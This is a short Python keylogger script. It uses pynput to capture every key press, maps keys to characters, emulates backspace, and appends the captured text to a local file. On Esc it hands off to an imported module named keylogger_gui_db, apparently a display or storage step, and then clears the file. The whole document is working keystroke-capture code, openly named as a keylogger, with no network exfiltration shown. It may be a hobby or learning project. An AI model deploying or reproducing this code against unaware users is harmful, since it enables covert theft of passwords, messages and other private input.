from pynput.keyboard import Key, Listener
import re
import os
import sys
from contextlib import redirect_stdout
from keylogger_gui_db import c_gui


translation = {
               Key.space: ' ',
               Key.esc: '',
               Key.ctrl_l: '',
               Key.shift: '',
               Key.ctrl: '',
               Key.ctrl_r: '',
               Key.enter: '\n',
               Key.delete: ''}


# simulating the Key.backspace
def backspace(f_file):
    if os.stat(f_file).st_size:
        with open(f_file, 'r') as d_f_chr:
            text = d_f_chr.read()
            text = re.sub(r'([.*]*|[.*\n.*]*)(.)$', r'\1', text)
        print(text)
        with open(f_file, 'w+') as w_file:
            w_file.write(swapper(text))
    else:
        pass


def re_rep(arg):
    pattern = re.compile(r"'(\w|,|.)'")
    str_arg = str(arg)
    replace = pattern.sub(r'\1', str_arg)
    return replace


def swapper(arg):
    try:
        result = translation[arg]
    except KeyError:
        result = re_rep(arg)
    return result


def key_logger():
    def write_block(_path, key):
        with open(_path, 'a+') as file:
            with redirect_stdout(file):
                sys.stdout.write(swapper(key))

    def clear_file(path):
        if path:
            open(path, 'w').close()

    def on_press(key):
        if key != Key.backspace:
            write_block('keyfile.txt', key)
        elif key == Key.backspace:
            backspace('keyfile.txt')

    def on_release(key):
        if key == Key.esc:
            c_gui()
            clear_file('keyfile.txt')
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == '__main__':
    key_logger()
